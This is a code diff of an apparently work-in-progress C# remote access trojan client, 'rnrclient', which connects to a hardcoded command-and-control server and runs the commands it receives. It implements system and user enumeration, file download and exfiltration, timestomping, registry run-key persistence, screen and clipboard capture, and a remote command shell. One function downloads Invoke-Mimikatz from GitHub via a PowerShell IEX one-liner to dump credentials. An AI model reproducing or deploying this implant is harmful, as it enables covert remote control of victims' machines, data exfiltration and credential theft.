@@ -1,5 +1,4 @@
-// client
-
+// work in progress
 using System;
 using System.Text;
 using System.IO;
@@ -18,24 +17,246 @@ using System.Collections;
 using Microsoft.Win32;
 using System.Collections.Generic;
 using System.Workflow.Activities;
-
+using System.Threading;
 //using Microsoft.Win32.TaskScheduler;
 
 namespace rnrclient
 {
     public class Program
     {
-        static string server = "10.0.0.1";
+        // GLOBALS
+        static string server = "172.16.80.129";
         static Int32 port = 9999;
         static TcpClient client = new TcpClient(server, port);
 
+        // MAIN
         public static void Main()
         {
-            runkey();
-            connect();
-            Console.WriteLine("Press any key to continue: ");
-            Console.ReadKey();
+            NetworkStream stream = connect();
+            while (true)
+            {
+                try
+                {
+                    String responseData = get_stream_data(stream);
+                    Console.WriteLine("[+] Received Command from {1}: {0}", responseData, server);
+                    string[] args = responseData.Split();
+                    parse_cmd(args, stream);
+                }
+                catch (Exception e)
+                {
+                    TimeSpan interval = new TimeSpan(0, 0, 10);
+                    Thread.Sleep(interval);
+                    Console.WriteLine("[-] Connection Failed!");
+                    Console.WriteLine("[+] Trying again!");
+                }
+            }
+            
         }
+
+        // ESTABLISH CONNECTION
+        static NetworkStream connect()
+        {
+            while (true)
+            {
+                try
+                {
+                    NetworkStream stream = client.GetStream();
+                    return stream;
+                }
+                catch (Exception e)
+                {
+                    // Error connecting
+                }
+
+            }
+        }
+
+        // GET DATA
+        static string get_stream_data(NetworkStream stream)
+        {
+            Byte[] data = new Byte[1024];
+            String responseData = String.Empty;
+            Int32 bytes = stream.Read(data, 0, data.Length);
+            responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
+            return responseData;
+        }
+
+        // PARSE C2 COMMANDS
+        static void parse_cmd(string[] args, NetworkStream stream)
+        {
+            try
+                {
+                if (args[0] == "hostinfo")
+                {
+                    send(hostinfo());
+                }
+                else if (args[0] == "userinfo")
+                {
+                    send(userinfo());
+                }
+                else if (args[0] == "shares")
+                {
+                    send(shares());
+                }
+                else if (args[0] == "ps")
+                {
+                    send(ps());
+                }
+                else if (args[0] == "envar")
+                {
+                    send(envar());
+                }
+                else if (args[0] == "dld")
+                {
+                    if (args.Length != 3)
+                    {
+                        send("Requires 2 arguments!");
+                    }
+                    else
+                    {
+                        send(dld(args[1], args[2]));
+                    }
+
+                }
+                else if (args[0] == "xfil")
+                {
+                    xfil(args[1], args[2]);
+                }
+                else if (args[0] == "ts")
+                {
+                    ts(args[1]);
+                }
+                else if (args[0] == "listdir")
+                {
+                    if (args.Length != 2)
+                    {
+                        send("Requires 1 argument!");
+                    }
+                    else
+                    {
+                        send(listdir(args[1]));
+                    }
+                }
+                else if (args[0] == "pwd")
+                {
+                    send(pwd());
+                }
+                else if (args[0] == "mkdir")
+                {
+                    send(mkdir(args[1]));
+                }
+                else if (args[0] == "mv")
+                {
+                    send(mv(args[1], args[2]));
+                }
+                else if (args[0] == "cp")
+                {
+                    send(cp(args[1], args[2]));
+                }
+                else if (args[0] == "del")
+                {
+                    send(del(args[1]));
+                }
+                else if (args[0] == "deldir")
+                {
+                    send(deldir(args[1]));
+                }
+                else if (args[0] == "run")
+                {
+                    if (args.Length != 2)
+                    {
+                        send("Requires 2 arguments!");
+                    }
+                    else
+                    {
+                        send(run(args[1]));
+                    }
+
+                }
+                else if (args[0] == "runadmin")
+                {
+                    if (args.Length != 2)
+                    {
+                        send("Requires one argument!");
+                    }
+                    else
+                    {
+                        runadmin(args[1]); // fix this function
+                    }
+                }
+                else if (args[0] == "arch")
+                {
+                    if (args.Length != 3)
+                    {
+                        send("Requires 2 arguments!");
+                    }
+                    else
+                    {
+                        send(arch(args[1], args[2]));
+                    }
+                }
+                else if (args[0] == "screencap")
+                {
+                    try
+                    {
+                        sendfile(screencap());
+                    }
+                    catch (Exception e)
+                    {
+                        send("Failed to send screencap!");
+                    }
+                }
+                else if (args[0] == "getfile")
+                {
+                    sendfile(args[1]);
+                }
+                else if (args[0] == "drop")
+                {
+                    //downloadfile(args[1]);
+                }
+                else if (args[0] == "persist")
+                {
+                    send(runkey());
+                }
+                else if (args[0] == "mimi")
+                {
+                    mimikatz();
+                }
+                else if (args[0] == "cat")
+                {
+                    send(cat(args[1]));
+                }
+                else if (args[0] == "clip")
+                {
+                    send(clip());
+                }
+                else if (args[0] == "cmd")
+                {
+                    cmd(args[1]);
+                }
+                else if (args[0] == "file")
+                {
+
+                }
+                else if (args[0] == "exit")
+                {
+                    stream.Close();
+                    client.Close();
+                    return;
+                }
+                else
+                {
+                    send("Command not recognized....\n");
+                }
+        }
+
+                catch (Exception e)
+                {
+                    send("Error! Double check command!");
+                }
+        }
+
+        // THINGS
         static void send(string s)
         {
             NetworkStream stream = client.GetStream();
@@ -48,227 +269,7 @@ namespace rnrclient
             byte[] file = System.IO.File.ReadAllBytes(path);
             stream.Write(file, 0, file.Length);
         }
-        static void downloadfile(string path)
-        {
-            NetworkStream stream = client.GetStream();
-            Byte[] data = new byte[1024];
-            Int32 bytes = 0;
-            int offset = 0;
-            while (true)
-            {
-                stream.Read(data, 0, 1024);
-                string resp = System.Text.Encoding.ASCII.GetString(data);
-                var args = resp.Split();
-                long size = long.Parse(args[1]);
-                Console.WriteLine("Size of payload: " + size.ToString());
-                /*try
-                {
-                    bytes += stream.Read(data, offset, data.Length);
-                    offset += data.Length;
-                    if (data.Length < 1024)
-                    {
-                        break;
-                    }
-                }
-                catch (Exception e)
-                {
-                    send("Failed to download file!");
-                }
-                */
-            }
-            try
-            {
-                System.IO.File.WriteAllBytes(path, data);
-                send("File successfully downloaded!");
-            }
-            catch (Exception e)
-            {
-                send("Failed to write file!");
-            }
-        }
-        static void connect()
-        {
-            while (true)
-            {
-                try
-                {
-                    NetworkStream stream = client.GetStream();
-                    Byte[] data = new Byte[1024];
-                    String responseData = String.Empty;
-                    Int32 bytes = stream.Read(data, 0, data.Length);
-                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
-                    Console.WriteLine("Received: {0}", responseData);
-                    string[] args = responseData.Split();
-                    if (args[0] == "hostinfo")
-                    {
-                        send(hostinfo());
-                    }
-                    else if (args[0] == "userinfo")
-                    {
-                        send(userinfo());
-                    }
-                    else if (args[0] == "shares")
-                    {
-                        send(shares());
-                    }
-                    else if (args[0] == "ps")
-                    {
-                        send(ps());
-                    }
-                    else if (args[0] == "envar")
-                    {
-                        send(envar());
-                    }
-                    else if (args[0] == "dld")
-                    {
-                        if (args.Length != 3)
-                        {
-                            send("Requires 2 arguments!");
-                        }
-                        else
-                        {
-                            send(dld(args[1], args[2]));
-                        }
 
-                    }
-                    else if (args[0] == "xfil")
-                    {
-                        xfil(args[1], args[2]);
-                    }
-                    else if (args[0] == "ts")
-                    {
-                        ts(args[1]);
-                    }
-                    else if (args[0] == "list")
-                    {
-                        if (args.Length != 2)
-                        {
-                            send("Requires 1 argument!");
-                        }
-                        else
-                        {
-                            send(list(args[1]));
-                        }
-                    }
-                    else if (args[0] == "pwd")
-                    {
-                        send(pwd());
-                    }
-                    else if (args[0] == "mkdir")
-                    {
-                        send(mkdir(args[1]));
-                    }
-                    else if (args[0] == "mv")
-                    {
-                        send(mv(args[1], args[2]));
-                    }
-                    else if (args[0] == "cp")
-                    {
-                        send(cp(args[1], args[2]));
-                    }
-                    else if (args[0] == "del")
-                    {
-                        send(del(args[1]));
-                    }
-                    else if (args[0] == "deldir")
-                    {
-                        send(deldir(args[1]));
-                    }
-                    else if (args[0] == "run")
-                    {
-                        if (args.Length != 2)
-                        {
-                            send("Requires 2 arguments!");
-                        }
-                        else
-                        {
-                            send(run(args[1]));
-                        }
-
-                    }
-                    else if (args[0] == "runadmin")
-                    {
-                        if (args.Length != 2)
-                        {
-                            send("Requires one argument!");
-                        }
-                        else
-                        {
-                            runadmin(args[1]); // fix this function
-                        }
-                    }
-                    else if (args[0] == "arch")
-                    {
-                        if (args.Length != 3)
-                        {
-                            send("Requires 2 arguments!");
-                        }
-                        else
-                        {
-                            send(arch(args[1], args[2]));
-                        }
-                    }
-                    else if (args[0] == "screencap")
-                    {
-                        try
-                        {
-                            sendfile(screencap());
-                        }
-                        catch (Exception e)
-                        {
-                            send("Failed to send screencap!");
-                        }
-                    }
-                    else if (args[0] == "getfile")
-                    {
-                        sendfile(args[1]);
-                    }
-                    else if (args[0] == "drop")
-                    {
-                        downloadfile(args[1]);
-                    }
-                    else if (args[0] == "persist")
-                    {
-                        //persist();
-                    }
-                    else if (args[0] == "mimi")
-                    {
-                        mimikatz();
-                    }
-                    else if (args[0] == "cat")
-                    {
-                        send(cat(args[1]));
-                    }
-                    else if (args[0] == "clip")
-                    {
-                        send(clip());
-                    }
-                    else if (args[0] == "cmd")
-                    {
-                        cmd(args[1]);
-                    }
-                    else if (args[0] == "file")
-                    {
-                        
-                    }
-                    else if (args[0] == "exit")
-                    {
-                        stream.Close();
-                        client.Close();
-                        return;
-                    }
-                    else
-                    {
-                        send("Command not recognized....\n");
-                    }
-                }
-
-                catch (Exception e)
-                {
-                    send("Error! Double check command!");
-                }
-            }
-        }
         static string hostinfo()
         {
             try
@@ -284,8 +285,8 @@ namespace rnrclient
                 var mac = "";
                 foreach (ManagementObject nic in searcher2.Get())
                 {
-                    mac += Convert.ToString(nic.Properties["MACAddress"].Value);
-                    if (mac.Length <= 17 && mac.Length != 0)
+                    mac = Convert.ToString(nic.Properties["MACAddress"].Value);
+                    if (mac.Length <= 17 && mac.Length != 0 && mac != Convert.ToString(nic.Properties["MACAddress"].Value))
                     {
                         response.AppendLine(mac);
                     }
@@ -316,6 +317,7 @@ namespace rnrclient
                 return "Failed to find host information!";
             }
         }
+
         static string userinfo()
         {
             try
@@ -337,6 +339,7 @@ namespace rnrclient
                 return "Failed to pull user information!";
             }
         }
+
         static string shares()
         {
             try
@@ -373,6 +376,7 @@ namespace rnrclient
                 return "Failed to enumerate shares!";
             }
         }
+
         static string ps()
         {
             StringBuilder allProcesses = new StringBuilder();
@@ -385,6 +389,7 @@ namespace rnrclient
             }
             return allProcesses.ToString();
         }
+
         static string envar()
         {
             StringBuilder response = new StringBuilder();
@@ -395,6 +400,7 @@ namespace rnrclient
             }
             return response.ToString();
         }
+
         static string dld(string path, string uri)
         {
             try
@@ -410,6 +416,7 @@ namespace rnrclient
                 return "Download failed!";
             }
         }
+
         static string xfil(string path, string uri)
         {
             try
@@ -425,6 +432,7 @@ namespace rnrclient
                 return "Exfil failed!";
             }
         }
+
         static string ts(string path)
         {
             try
@@ -439,7 +447,8 @@ namespace rnrclient
                 return "Failed to timestomp!";
             }
         }
-        static string list(string path)
+
+        static string listdir(string path)
         {
             try
             {
@@ -469,6 +478,7 @@ namespace rnrclient
                 return "Failed to enumerate directory " + path;
             }
         }
+
         static string pwd()
         {
             try
@@ -480,6 +490,13 @@ namespace rnrclient
                 return "Failed to get current working directory!";
             }
         }
+
+       static string cd()
+        {
+
+            return "yo";
+        }
+
         static string mkdir(string dir)
         {
             try
@@ -492,6 +509,7 @@ namespace rnrclient
                 return "Failed to create directory " + dir;
             }
         }
+
         static string mv(string src, string dest)
         {
             try
@@ -504,6 +522,7 @@ namespace rnrclient
                 return "Failed to move file!" + e;
             }
         }
+
         static string cp(string src, string dest)
         {
             try
@@ -516,6 +535,7 @@ namespace rnrclient
                 return "Failed to copy file!";
             }
         }
+
         static string del(string path)
         {
             try
@@ -528,6 +548,7 @@ namespace rnrclient
                 return "Failed to delete " + path;
             }
         }
+
         static string deldir(string path)
         {
             try
@@ -540,6 +561,7 @@ namespace rnrclient
                 return "Failed to delete " + path;
             }
         }
+
         static string arch(string src, string dest)
         {
             try
@@ -552,6 +574,7 @@ namespace rnrclient
                 return "Failed to create archive!";
             }
         }
+
         static string cat(string path)
         {
             try
@@ -563,6 +586,7 @@ namespace rnrclient
                 return "File not found!:";
             }
         }
+
         static string screencap()
         {
             try
@@ -579,6 +603,7 @@ namespace rnrclient
                 return "Failed to capture screen!";
             }
         }
+
         static string drop(string path)
         {
             try
@@ -591,6 +616,7 @@ namespace rnrclient
                 return "Failed to download file!";
             }
         }
+
         static string run(string proc)
         {
             try
@@ -603,6 +629,7 @@ namespace rnrclient
                 return "Failed to start process!";
             }
         }
+
         private static bool runadmin(string proc)
         {
             var SelfProc = new ProcessStartInfo
@@ -623,6 +650,7 @@ namespace rnrclient
                 return false;
             }
         }
+
         static string runkey()
         {
             try
@@ -636,7 +664,8 @@ namespace rnrclient
                 return "Failed to create registry entry!";
             }
         }
-        static void persist(string type)
+
+        static void fix_me(string type)
         {
             var split = Environment.CommandLine.Split();
             var path = split[0];
@@ -652,8 +681,8 @@ namespace rnrclient
             {
                 //
             }
-
         }
+
         static void mimikatz()
         {
             string args = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m";
@@ -662,10 +691,12 @@ namespace rnrclient
             psinfo.Arguments = args;
             Process.Start(psinfo);
         }
+
         static string clip()
         {
             return System.Windows.Forms.Clipboard.GetText();
         }
+
         static void cmd(string args)
         {
             Stream stream = client.GetStream();
@@ -691,6 +722,48 @@ namespace rnrclient
                 sb.Remove(0, sb.Length);
             }
         }
+
+        /*
+        static void downloadfile(string path)
+        {
+            NetworkStream stream = client.GetStream();
+            Byte[] data = new byte[1024];
+            Int32 bytes = 0;
+            int offset = 0;
+            while (data !< 1024)
+            {
+                stream.Read(data, 0, 1024);
+                string resp = System.Text.Encoding.ASCII.GetString(data);
+                var args = resp.Split();
+                long size = long.Parse(args[1]);
+                Console.WriteLine("Size of payload: " + size.ToString());
+                try
+                {
+                    bytes += stream.Read(data, offset, data.Length);
+                    offset += data.Length;
+                    if (data.Length < 1024)
+                    {
+                        break;
+                    }
+                }
+                catch (Exception e)
+                {
+                    send("Failed to download file!");
+                }
+
+            }
+            try
+            {
+                System.IO.File.WriteAllBytes(path, data);
+                send("File successfully downloaded!");
+            }
+            catch (Exception e)
+            {
+                send("Failed to write file!");
+            }
+
+        }
+*/
         private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
             StringBuilder strOutput = new StringBuilder();
